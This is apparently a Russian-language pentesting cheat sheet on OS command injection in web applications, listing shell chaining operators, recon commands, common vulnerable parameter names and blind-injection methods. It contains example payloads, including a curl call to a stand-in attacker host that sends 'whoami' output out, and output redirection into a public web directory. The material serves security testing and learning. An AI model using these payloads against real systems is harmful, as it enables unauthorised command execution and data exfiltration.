Инъекции команд ОС позволяют атакующему выполнять команды ОС на сервере, на котором размещено веб-приложение
## Источники информации
- [PayloadAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks Command Injection](https://hacktricks.wiki/en/pentesting-web/command-injection.html)
## Инструменты
- [Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection Exploitation Tool
## Linux Terminal
- `<command 1> ; <command 2>` - выполняется `command 1`, после чего выполняется `command 2` 
- `<command 1> | <command 2>` - направляет результат выполнения `command 1` в `command 2`
- `<command 1> && <command 2>` - если выполнится `command 1`, то выполнится `command 2`
- `<command 1> || <command 2>` - если не выполнится `command 1`, то выполнится `command 2`
- `` `<command>` `` / ``echo `<command>` `` - выполнится `command`
- `$(<command>)` / `echo $(<command>)` - выполнится `command`
- `& echo <command>`
- `& echo <command> &`
## Полезные команды ОС

| Цель команды              | Linux                 | Windows         |
| ------------------------- | --------------------- | --------------- |
| Имя текущего пользователя | `whoami`              | `whoami`        |
| Операционная система      | `uname -a`            | `ver`           |
| Конфигурация сети         | `ifconfig` или `ip a` | `ipconfig /all` |
| Сетевые подключения       | `netstat -an`         | `netstat -an`   |
| Работающие процессы       | `ps -ef` ил `ps aux`  | tasklist`       |
## Места поиска
- Параметры GET-запроса
- Параметры POST-запроса
- HTTP-заголовки
	- Cookies
	- X-Forwarded-For
	- User-agent
	- Refferer

Наиболее популярные параметры GET-запроса для OS Command Injection:
```HTTP
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
## Виды
### Command Injection 
Стандартная инъекция с выводом результата работы команды
### Blind Command Injection
Инъекция без вывода результата работы команды
#### Time delay
Метод заключается в отправке запроса с командой, которая выполняется определенное время. Если при этом сервер не отвечает, то можно считать, что присутствует Command Injection. 
Пример: `ping -c 10 127.0.0.1` (отправка 10 запросов, что даст 9-11 секунд задержки).
#### Out-of-band
Метод основан на взаимодействии с внешним веб-сервером. С помощью этого метода можно проверить наличие Command Injection и, если это подтвердилось, можно использовать контролируемый веб-сервер как точку приема данных из атакуемого веб-сервера.
Пример:
1. Атакующий на своём сервере запускает HTTP-сервер: `python3 -m http.server 9999`
2. На атакуемом сервере выполняется OS Command Injection: `1.1.1.1; curl http://attacker.com:9999/test`. Пришедший запрос на  HTTP-сервер подтвердит наличие уязвимости.
3. Далее можно попробовать внедрить ещё одну команду внутрь нашего пейлоада, выполнить команду и узнать имя пользователя, от которого работает веб-север: 
   `` 1.1.1.1; curl http://attacker.com:9999/`whoami` ``
#### Redirecting output
Метод заключается в перенаправлении вывода выполнения команды в файл по указанному пути. Дальше атакующий сможет прочитать содержимое файла. Например, можно записать файл в папку `/static`, которая, как правило, содержит в себе файлы стилей или JS-скриптов. Данные файлы загружаются при нормальном взаимодействии с веб-приложением, а значит доступ к ним открытый. Пример: `1.1.1.1; whoami > /var/www/html/static/outputlog.txt`
## Обход защиты
Варианты обхода: [HackTricks Bypass Linux Restrictions](https://hacktricks.wiki/en/linux-hardening/linux-basics/bypass-linux-restrictions/index.html#references)
